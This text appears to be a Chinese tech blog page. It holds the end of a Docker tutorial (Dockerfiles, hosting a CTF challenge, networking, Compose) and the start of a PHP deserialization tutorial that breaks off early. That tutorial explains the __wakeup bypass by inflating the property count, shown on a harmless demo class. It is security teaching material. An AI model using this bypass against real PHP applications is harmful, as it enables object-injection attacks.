<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个Dockerfile文件</span><br><span class="line"># 文件中的内容</span><br><span class="line"></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]</span><br><span class="line"></span><br><span class="line">CMD echo &quot;-----end-----&quot;</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker build -f /test/Dockerfile -t yb/centos:1.0 .</span><br><span class="line"></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line">docker run -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>

<p>构建步骤：</p>
<p>1.编写一个 dockerfile 文件</p>
<p>2.docker build 构建成为一个镜像</p>
<p>3.docker run 运行镜像</p>
<p>4.docker push 发布镜像（DockerHub，阿里云镜像仓库）</p>
<h3 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM                # 基础镜像，一切从这里开始</span><br><span class="line">MAINTAINER          # 镜像是谁写的，姓名+邮箱</span><br><span class="line">RUN                 # 镜像构建的时候需要运行的命令</span><br><span class="line">ADD                 # 将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</span><br><span class="line">WORKDIR             # 镜像的工作目录</span><br><span class="line">VOLUME              # 挂载的目录</span><br><span class="line">EXPOSE              # 保留端口配置</span><br><span class="line">CMD                 # 指定这个容器启动的时候要运行的命令（只有最后一个会生效）</span><br><span class="line">EMTRYPOINT          # 指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD             # 当构建一个被继承DockerFile，这个时候就会运行ONBUILD的指令，触发指令</span><br><span class="line">COPY                # 功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</span><br><span class="line">ENV                 # 构建的时候设置环境变量</span><br></pre></td></tr></table></figure>

<ul>
<li>CMD ：指定容器启动的时候要运行的命令，只有最后一个会生效</li>
<li>ENTRYPOINT ：指定容器启动的时候要运行的命令,命令可以追加</li>
</ul>
<p>通过编写Dockerfile文件来制作Centos镜像，并在官方镜像的基础上添加vim和net-tools工具。首先在&#x2F;home&#x2F;dockfile 目录下新建文件mydockerfile-centos。然后使用上述指令编写该文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@iZwz99sm8v95sckz8bd2c4Z dockerfile]# cat mydockerfile-centos</span><br><span class="line">FROM centos:7</span><br><span class="line">MAINTAINER Yb&lt;2365043546@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local                      # 设置环境变量MYPATH</span><br><span class="line">WORKDIR $MYPATH                            # 直接使用上面设置的环境变量，指定/usr/local为工作目录</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80                                  # 将容器80端口暴露出来，允许外部连接这个端口</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;---end---&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#docker build -f dockerfile文件路径 -t 镜像名[:版本号] .</span><br><span class="line">docker build -f mydocker -t mycentos:1.0 .</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it mycentos:1.0</span><br><span class="line">pwd</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>通过<code>docker history 容器id</code>命令来查看镜像的构建步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history mycentos:1.0</span><br></pre></td></tr></table></figure>

<h2 id="用Docker搭建环境部署ctf题目"><a href="#用Docker搭建环境部署ctf题目" class="headerlink" title="用Docker搭建环境部署ctf题目"></a>用Docker搭建环境部署ctf题目</h2><p>首先找一个有lamp环境的docker镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure>

<p>拉取镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>

<p>新建docker容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3344:80 -p 9999:3306 tutum/lamp</span><br></pre></td></tr></table></figure>

<p>查看系统中运行的docker容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>使用浏览器访问，查看是否成功映射</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:3344</span><br></pre></td></tr></table></figure>

<p>环境已经搭建完毕，可以将ctf题目源码拷贝到container的主目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 题目文件 容器id:var/www/html</span><br></pre></td></tr></table></figure>

<p>安装vim</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM tutum/lamp</span><br><span class="line">COPY web/index.php /var/www/html</span><br><span class="line">COPY web/login.php /var/www/html</span><br><span class="line">COPY web/flag.txt /</span><br><span class="line">EXPOSE 80</span><br><span class="line">docker build -t yb/test:1.0 .</span><br><span class="line">docker run -d -p 3344:80 yb/test:1.0</span><br></pre></td></tr></table></figure>

<h2 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h2><p>查看所有的Docker网络：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure>

<p>Docker默认提供了四个网络模式，说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bridge：容器默认的网络是桥接模式(自己搭建的网络默认也是使用桥接模式,启动容器默认也是使用桥接模式)。此模式会为每一个容器分配、设置IP等，并将容器连接到一个docker0虚拟网桥，通过docker0网桥以及Iptables nat表配置与宿主机通信。</span><br><span class="line"></span><br><span class="line">none：不配置网络，容器有独立的Network namespace，但并没有对其进行任何网络设置，如分配veth pair 和网桥连接，配置IP等。</span><br><span class="line"></span><br><span class="line">host：容器和宿主机共享Network namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。</span><br><span class="line"></span><br><span class="line">container：创建的容器不会创建自己的网卡，配置自己的IP容器网络连通。容器和另外一个容器共享Network namespace（共享IP、端口范围）。</span><br></pre></td></tr></table></figure>

<p>容器默认使用bridge网络模式，我们使用该docker run –network&#x3D;选项指定容器使用的网络：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host模式：使用 --net=host 指定。</span><br><span class="line">none模式：使用 --net=none 指定。</span><br><span class="line">bridge模式：使用 --net=bridge 指定，默认设置。</span><br><span class="line">container模式：使用 --net=container:NAME_or_ID 指定。</span><br></pre></td></tr></table></figure>

<p>当启动一个容器时，可以看到容器内部和Linux主机都会创建一个新的网卡，而这两个网卡都是成对的。使用的技术就是evth-pair。evth-pair 就是一对的虚拟设备接口，他们是成对出现的，一段连着协议，一段彼此相连。evth-pair充当一个桥梁，连接各种虚拟网络设备。</p>
<p>Linux主机可以直接网络连接Docker容器。Docker容器和容器之间同样可以直接网络连接的。</p>
<h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network --help</span><br></pre></td></tr></table></figure>

<p>自定义一个网络</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">--driver bridge          #指定bridge驱动程序来管理网络</span><br><span class="line">--subnet 192.168.0.0/16  #指定网段的CIDR格式的子网</span><br><span class="line">--gateway 192.168.0.1 	 #指定主子网的IPv4或IPv6网关</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021447165.png"></p>
<p>网络mynet创建成功后，查看网络信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network inspect mynet</span><br></pre></td></tr></table></figure>

<p>下面启动两个容器，指定使用该自定义网络mynet，测试处于自定义网络下的容器，是否可以直接通过容器名进行网络访问。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --name tomcat-net-01 --net mynet tomcat </span><br><span class="line">docker run -d -P --name tomcat-net-02 --net mynet tomcat </span><br><span class="line">docker network inspect mynet</span><br></pre></td></tr></table></figure>

<p>在我们的自定义网络下，容器之间既可以通过容器名也可以通过ip地址进行网络通信。 我们自定义的网络默认已经帮我们维护了容器间的网络通信问题，这是实现网络互联的推荐方式。</p>
<h3 id="网络之间的互联"><a href="#网络之间的互联" class="headerlink" title="网络之间的互联"></a>网络之间的互联</h3><p>没有设置的情况下，不同网络间的容器是无法进行网络连接的。如图，两个不同的网络docker0和自定义网络mynet的网络模型图：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021447437.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network connect mynet tomcat-01</span><br></pre></td></tr></table></figure>

<p>设置完成后我们就可以实现不同网络之间的容器互联了。</p>
<p>假设要跨网操作别人，就需要使用docker network connect 连通</p>
<h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p>Compose是Docker官方的开源项目</p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>授权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>测试安装结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h3 id="yaml规则"><a href="#yaml规则" class="headerlink" title="yaml规则"></a>yaml规则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#3层</span><br><span class="line">version:版本</span><br><span class="line"></span><br><span class="line">service:服务</span><br><span class="line">  服务1: web</span><br><span class="line">	#服务配置</span><br><span class="line">	images</span><br><span class="line">	build</span><br><span class="line">	network</span><br><span class="line">	...</span><br><span class="line">  服务2: redis</span><br><span class="line">  </span><br><span class="line">#其他配置  网络/卷  全局规则</span><br><span class="line">volumes:</span><br><span class="line">network:</span><br><span class="line">configs:</span><br></pre></td></tr></table></figure>

<p>官方：<a target="_blank" rel="noopener" href="https://docs.docker.com/compose/compose-file/#">https://docs.docker.com/compose/compose-file/#</a></p>
<h3 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h3><p>WordPress:<a target="_blank" rel="noopener" href="https://docs.docker.com/samples/wordpress/">https://docs.docker.com/samples/wordpress/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mkdir my_wordpress</span><br><span class="line">cd my_wordpress/</span><br><span class="line">vim docker-compose.yml</span><br><span class="line">services:</span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:10.6.4-focal</span><br><span class="line">    command: &#x27;--default-authentication-plugin=mysql_native_password&#x27;</span><br><span class="line">    volumes:</span><br><span class="line">      - db_data:/var/lib/mysql</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=somewordpress</span><br><span class="line">      - MYSQL_DATABASE=wordpress</span><br><span class="line">      - MYSQL_USER=wordpress</span><br><span class="line">      - MYSQL_PASSWORD=wordpress</span><br><span class="line">    expose:</span><br><span class="line">      - 3306</span><br><span class="line">      - 33060</span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress:latest</span><br><span class="line">    ports:</span><br><span class="line">      - 3344:80</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - WORDPRESS_DB_HOST=db</span><br><span class="line">      - WORDPRESS_DB_USER=wordpress</span><br><span class="line">      - WORDPRESS_DB_PASSWORD=wordpress</span><br><span class="line">      - WORDPRESS_DB_NAME=wordpress</span><br><span class="line">volumes:</span><br><span class="line">  db_data:</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 ip:3344 发现WordPress部署成功</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2022/07/13/Docker%E5%9F%BA%E7%A1%80/" data-id="cln8eubxq0000x0tgboxyhcqj" data-title="Docker基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-php反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2022-04-13T08:09:45.000Z" itemprop="datePublished">2022-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是序列化？</p>
<p><strong>对象转换成字符串</strong></p>
<p>为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等</p>
<p>什么是反序列化？</p>
<p><strong>字符串转换成对象</strong></p>
<p>php序列化和反序列化的<strong>函数</strong>：</p>
<p>序列化：serialize()</p>
<p>反序列化：unserialize()</p>
<p>对字符串进行序列化后是它本身（<strong>ctfshow web260</strong>）</p>
<h2 id="常见的序列化格式"><a href="#常见的序列化格式" class="headerlink" title="常见的序列化格式"></a>常见的序列化格式</h2><ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>数组序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>);</span><br><span class="line">    <span class="variable">$a_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:2:&quot;hi&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array                  b - boolean  </span><br><span class="line">d - double                 i - integer</span><br><span class="line">o - common object          r - reference</span><br><span class="line">s - string                 C - custom object</span><br><span class="line">O - class                  N - null</span><br><span class="line">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure>

<p>对象序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;abab&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">pr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$stu</span> = <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    <span class="variable">$stu_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$stu</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stu_ser</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Student&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;abab&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br></pre></td></tr></table></figure>

<p>注：发现这里没有序列化的结果只有成员变量，没有成员函数</p>
<p>还有一种成员变量就是protected类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$aa</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$bb</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cc</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;aa = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bb = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cc = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$d_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d_ser</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:2:&quot;aa&quot;;s:3:&quot;aaa&quot;;s:8:&quot;testbb&quot;;s:3:&quot;bbb&quot;;s:5:&quot;*cc&quot;;s:3:&quot;ccc&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果是private类型，会在变量名前加上<strong>\x00类名\x00</strong>，如果是protected类型，则会加上<strong>\x00*\x00</strong>，这些都是不可见字符</p>
<p><strong>如果需要本地存储推荐 “ urlencode ”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencode($d_ser);</span><br></pre></td></tr></table></figure>

<h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep()       //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct()   //对象被创建时触发</span><br><span class="line">__destruct()    //对象被销毁时触发</span><br><span class="line">__call()        //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()  //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()         //当调用一个不存在的或者是无法访问的属性的时候被调用</span><br><span class="line">__set()         //用于将数据写入不可访问的属性</span><br><span class="line">__isset()       //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset()       //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()    //把类当作字符串使用时触发</span><br><span class="line">__invoke()      //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<h2 id="反序列化绕过小Trick"><a href="#反序列化绕过小Trick" class="headerlink" title="反序列化绕过小Trick"></a>反序列化绕过小Trick</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">版本：</span><br><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure>

<p>利用方法：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;222&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a,<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> test);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">111</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;&#x27;)</span><br><span class="line">test Object ([a] =&gt; 222 )</span><br></pre></td></tr></table></figure>

<p>这里对象属性的值就是 “1” ，修改</p>
